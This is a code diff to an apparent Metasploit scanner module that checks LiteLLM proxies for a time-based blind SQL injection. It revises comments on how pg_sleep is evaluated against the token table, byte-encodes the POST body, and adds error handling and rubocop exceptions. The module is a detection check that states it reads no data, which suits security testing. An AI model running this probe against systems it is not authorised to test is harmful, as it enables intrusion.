@@ -34,11 +34,9 @@ class MetasploitModule < Msf::Auxiliary
           module does not read or exfiltrate data.
 
           Detection requires the target to have provisioned at least one virtual
-          key. The injectable predicate sits in a WHERE clause that PostgreSQL
-          evaluates only against matching rows, so when the token table is empty
-          the pg_sleep never executes and the proxy appears (falsely) safe. Any
-          LiteLLM proxy in real use has issued keys; a freshly initialized proxy
-          with an empty token table may not respond to the time-based probe.
+          key. The injected predicate is evaluated while looking up stored keys;
+          an empty token table can avoid evaluating pg_sleep and produce no
+          timing signal.
         },
         'Author' => [
           'Tencent YunDing Security Lab', # vulnerability discovery
@@ -89,9 +87,8 @@ class MetasploitModule < Msf::Auxiliary
     nil
   end
 
-  # pg_sleep is evaluated once per matching row, so a populated token table can
-  # delay the response by several multiples of SqliDelay; add a fixed margin for
-  # the network round-trip on top of that.
+  # The uncorrelated sleep subquery runs once when evaluated, even with multiple
+  # token rows. Leave a margin for database and network overhead.
   def request_timeout
     (datastore['SqliDelay'] * 4 + 20).ceil
   end
@@ -106,12 +103,13 @@ class MetasploitModule < Msf::Auxiliary
   # served from cache and skip the database, suppressing the pg_sleep.
   def create_litellm_sqli
     create_sqli(dbms: PostgreSQLi::TimeBasedBlind) do |payload|
+      # Rex frames raw data by String#length, so send bytes for Unicode models.
       body = {
         'model' => datastore['MODEL'],
         'messages' => [{ 'role' => 'user', 'content' => 'x' }],
         'max_tokens' => 1
-      }.to_json
-      send_request_cgi(
+      }.to_json.b
+      res = send_request_cgi(
         {
           'method' => 'POST',
           'uri' => normalize_uri(target_uri.path),
@@ -121,6 +119,9 @@ class MetasploitModule < Msf::Auxiliary
         },
         request_timeout
       )
+      raise Rex::ConnectionError.new(reason: 'No response to the SQL injection probe') unless res
+
+      res
     end
   end
 
@@ -131,16 +132,20 @@ class MetasploitModule < Msf::Auxiliary
     else
       Exploit::CheckCode::Safe('No time-based SQL injection signal observed')
     end
+  rescue Rex::ConnectionError => e
+    elog('Failed to complete the LiteLLM SQL injection check', error: e)
+    Exploit::CheckCode::Unknown("Failed to complete the SQL injection check: #{e.message}")
   end
 
   def run_host(ip)
     code = check_host(ip)
+    # HttpClient/Scanner use the base print_prefix, which does not add the peer.
     unless code == Exploit::CheckCode::Vulnerable
-      print_status("#{peer} - #{code.message}")
+      print_status("#{peer} - #{code.message}") # rubocop:disable Lint/RedundantPeerInPrint
       return
     end
 
-    print_good("#{peer} - #{code.message}")
+    print_good("#{peer} - #{code.message}") # rubocop:disable Lint/RedundantPeerInPrint
     report_vuln(
       host: rhost,
       port: rport,
